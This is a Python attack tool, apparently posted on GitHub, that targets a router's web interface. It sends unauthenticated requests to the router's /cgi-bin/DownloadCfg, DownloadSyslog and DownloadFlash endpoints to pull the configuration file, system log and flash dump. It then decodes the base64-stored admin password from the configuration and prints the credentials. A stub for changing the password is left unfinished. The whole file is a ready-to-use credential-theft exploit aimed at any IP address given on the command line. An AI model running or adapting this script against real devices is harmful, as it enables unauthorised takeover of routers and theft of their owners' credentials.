#github.com/4d000
import socket
import optparse
import base64

def getArgs():
    parser=optparse.OptionParser()
    parser.add_option("-t","--target",dest="target",help="Target IP Address")
    parser.add_option("-c","--config",action="store_true",dest="config",help="Get cfg file")
    parser.add_option("-l","--log",action="store_true",dest="log",help="Get log file")
    parser.add_option("-f","--flash",action="store_true",dest="flash",help="Get flash dump")
    parser.add_option("-p","--password",action="store_true",dest="psw",help="Get admin password")
    (options, arguements)=parser.parse_args()
    if not options.target:
        parser.error("No Target IP Address")
    if not options.config and not options.log and not options.flash and not options.psw:
        parser.error("What should it do??? use -c or -l or -f (check -h)")
    return options

def getFile(target,port,request,filename):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendall(request)

    response = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        response += chunk
    s.close()

    # Find where the body starts (skip the headers)
    header_end = response.find(b"\r\n\r\n") # The end of headers is indicated by '\r\n\r\n'

    if header_end != -1:
        # Extract the body (content) after the headers
        body = response[header_end + 4:] # Skip the headers (including the '\r\n\r\n')

        # Save only the body (file content) as a binary file
        with open(filename, 'wb') as f:
            f.write(body)
        print(f"File saved as {filename}")
    else:
        print("Error: Headers not found in the response.")

    
def getPsw():
    try:
        with open("RouterCfm.cfg","r") as f:
            username=""
            password=""
            for line in f:
                if "http_username=" in line:
                    username=line.replace("http_username=","").strip()
                elif "http_passwd=" in line:
                    password=base64.b64decode(line.replace("http_passwd=","")).decode("utf-8").strip()
            print(f"Username: {username}\nPassword: {password}")
    except FileNotFoundError:
        print("Cfg file not found, use -c or --config")
        
#to do
def setPsw(newPsw):
    pass

if __name__=="__main__":
    options=getArgs()
    target=options.target
    port=80

    if options.config:
        getFile(target,port,b"GET /cgi-bin/DownloadCfg HTTP/1.0\r\n\r\n","RouterCfm.cfg")
    if options.log:
        getFile(target,port,b"GET /cgi-bin/DownloadSyslog HTTP/1.0\r\n\r\n","RouterSystem.log")
    if options.flash:
        getFile(target,port,b"GET /cgi-bin/DownloadFlash HTTP/1.0\r\n\r\n","RouterFlash.bin")
    if options.psw:
        getPsw()
